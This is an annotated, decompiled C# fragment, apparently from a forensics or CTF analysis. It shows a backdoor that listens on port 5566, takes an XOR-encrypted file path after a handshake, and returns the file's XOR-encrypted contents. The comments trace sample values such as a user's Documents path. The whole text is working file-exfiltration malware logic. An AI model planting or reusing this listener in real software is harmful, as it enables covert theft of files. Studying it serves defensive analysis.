// Listen on 0.0.0.0:5566
int port = 5566;
tcpListener = new TcpListener(IPAddress.Parse("0.0.0.0"), port);
tcpListener.Start();
byte[] array = new byte[256];
for (;;)
{
    TcpClient tcpClient = tcpListener.AcceptTcpClient();
    NetworkStream stream = tcpClient.GetStream();
    int count;
    // Send @ to get into the while loop
    while ((count = stream.Read(array, 0, array.Length)) != 0 && !(Encoding.ASCII.GetString(array, 0, count) != "@"))
    {
        // s = 32-bit random number
        string s = BBBB.RandomString(32);
        byte[] bytes = Encoding.ASCII.GetBytes(s);
        // bytes = 69 54 41 56 67 58 4c 64 57 41 6b 78 53 4c 35 61 45 69 69 57 79 5a 71 54 61 6a 31 35 42 48 5a 5a
        stream.Write(bytes, 0, bytes.Length);
        // array = 24 00 00 00
        stream.Read(array, 0, 4);
        // num = 36
        int num = BitConverter.ToInt32(array, 0);
        // array = 71 59 6a 6d 16 53 10 16 3f 40 42 38 75 5d 01 42 0c 04 5c 16 12 6b 4d 17 05 5a 17 56 4a 5b 47 45 1c 17 4e 4c
        stream.Read(array, 0, num);
        // s2 = 32-63-36-38-65-36-62-65-63-30-36-64-31-32-62-37-61-61-32-62-61-37-39-65-64-34-64-35-38-32-37-31
        string s2 = CCC.Calculate(bytes);
        byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
        int num2 = bytes2.Length;
        for (int i = 0; i < num; i++)
        {
            //byte[] array3 = array;
            //int num3 = i;
            //int num6 = num3;
            //array3[num6] ^= bytes2[i % num2];
            array[i] ^= bytes2[i % num2];
        }
        // filename = C:\\Users\\pt\\Documents\\transcript.txt -> C:\Users\pt\Documents\transcript.txt
        using (FileStream fileStream = File.OpenRead(Encoding.UTF8.GetString(array).TrimEnd(new char[1])))
        {
            byte[] array2 = new byte[1024];
            int num4;
            while ((num4 = fileStream.Read(array2, 0, array2.Length)) > 0)
            {
                for (int j = 0; j < num4; j++)
                {
                    //byte[] array4 = array2;
                    //int num5 = j;
                    //int num7 = num5;
                    //array4[num7] ^= bytes2[j % num2];
                    array2[j] ^= bytes2[j % num2];
                }
                // add file content to the back of size
                byte[] buffer = (from x in BitConverter.GetBytes(num4).Concat(array2) select x).ToArray<byte>();
                stream.Write(buffer, 0, 4 + num4);
            }
            break;
        }
    }
    tcpClient.Close();
}